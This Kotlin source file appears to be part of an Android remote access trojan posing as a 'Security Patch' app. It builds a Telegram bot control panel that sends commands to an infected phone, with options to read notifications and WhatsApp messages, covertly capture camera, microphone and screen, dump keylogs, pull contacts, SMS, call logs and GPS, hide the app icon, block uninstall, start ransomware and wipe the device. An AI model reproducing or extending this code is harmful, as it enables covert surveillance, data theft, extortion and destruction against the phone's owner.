package com.android.security.patch

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object InlineMenu {

    fun show(ctx: Context, chatId: Long) {
        val kb = JSONObject().apply { put("inline_keyboard", buildRows()) }
        val text = "<b>Security Patch</b>\n<i>control panel</i>\n\n" +
            "Pilih menu. Semua aksi dikirim ke device ini."
        val obj = JSONObject().apply {
            put("chat_id", chatId)
            put("text", text)
            put("parse_mode", "HTML")
            put("reply_markup", kb)
        }
        val res = java.net.URL(Config.API + Config.BOT_TOKEN + "/sendMessage").openConnection().let { c ->
            (c as java.net.HttpURLConnection).apply {
                requestMethod = "POST"; doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 30000; readTimeout = 60000
            }
            c.outputStream.use { it.write(obj.toString().toByteArray()) }
            c.inputStream.bufferedReader().readText()
        }
    }

    private fun row(vararg pairs: Pair<String, String>): JSONArray {
        val arr = JSONArray()
        for ((label, data) in pairs) {
            arr.put(JSONObject().apply { put("text", label); put("callback_data", data) })
        }
        return arr
    }

    private fun buildRows(): JSONArray {
        val kb = JSONArray()

        // NAVIGASI
        kb.put(row("← Back" to "back", "⌂ Home" to "home", "▤ Recents" to "recents"))
        kb.put(row("↑ Notif Bar" to "notif_pull", "🔔 Read All" to "notifs"))
        kb.put(row("🔔 Live All" to "notifs", "📜 History All" to "notifs|history"))
        kb.put(row("📱 WA Live" to "notifs|wa", "📱 WA Hist" to "notifs|history|wa"))
        kb.put(row("💼 WA Biz Live" to "notifs|wa_biz", "💼 WA Biz Hist" to "notifs|history|wa_biz"))
        kb.put(row("🧹 Clear History" to "notifs_clear"))

        // MEDIA
        kb.put(row("📷 Cam Rear" to "cam|rear", "🤳 Cam Front" to "cam|front"))
        kb.put(row("🎙 Mic 10s" to "mic|10", "🎙 Mic 30s" to "mic|30"))

        // SISTEM
        kb.put(row("🔒 Lock" to "lock", "💥 Hardlock" to "hardlock"))
        kb.put(row("🔓 Unlock" to "unlock", "🔑 Set PIN" to "setpin"))
        kb.put(row("👁 Admin" to "admin|on", "🚫 Admin Off" to "admin|off"))
        kb.put(row("🔆 Flash On" to "flash_on", "🌑 Flash Off" to "flash_off"))
        kb.put(row("✨ Blink 5s" to "flash_blink|5", "🎨 Wallpaper" to "wallpaper"))
        kb.put(row("🙈 Hide Icon" to "hide_icon", "👀 Show Icon" to "show_icon"))
        kb.put(row("📳 Vibrate" to "vibrate|500", "🔕 Overlay Off" to "overlay_off"))

        // APP
        kb.put(row("📦 List Apps" to "apps", "▶ Open App" to "app_open"))
        kb.put(row("👁 Hide App" to "app_hide", "👁 Show App" to "app_show"))

        // INTERAKSI
        kb.put(row("💬 Toast" to "toast", "🔊 TTS" to "tts"))
        kb.put(row("🪟 Popup" to "popup"))

        // DATA
        kb.put(row("📇 Contacts" to "contacts", "💬 SMS" to "sms"))
        kb.put(row("📞 Call Log" to "calllog", "📍 GPS" to "gps"))
        kb.put(row("ℹ Device" to "devinfo", "📁 LS /sdcard" to "ls|/sdcard"))
        kb.put(row("⌨ Keylog Dump" to "keylog|dump", "🧹 Keylog Clear" to "keylog|clear"))

        // LAYAR
        kb.put(row("📸 Screenshot" to "ss", "🎥 Rec 30s" to "rec_start|30"))
        kb.put(row("⏹ Stop Rec" to "rec_stop"))

        // DANGER
        kb.put(row("🔐 Ransom Start" to "ransom|start", "🔓 Ransom Stop" to "ransom|stop"))
        kb.put(row("⚠ Wipe Device" to "wipe|CONFIRM", "🧹 Format Storage" to "format_storage"))
        kb.put(row("🔍 Check Paths" to "check_paths", "🔄 Reboot" to "reboot|CONFIRM"))

        // RULES
        kb.put(row("⚙ Rules" to "rules", "🛡 Toggle Anti-Uni" to "anti_uninstall|toggle"))
        kb.put(row("🤬 Hang Now" to "hang_now|test", "⏹ Stop Hang" to "hang_stop"))

        // CLOSE
        kb.put(row("✖ Close" to "close_menu"))

        return kb
    }
}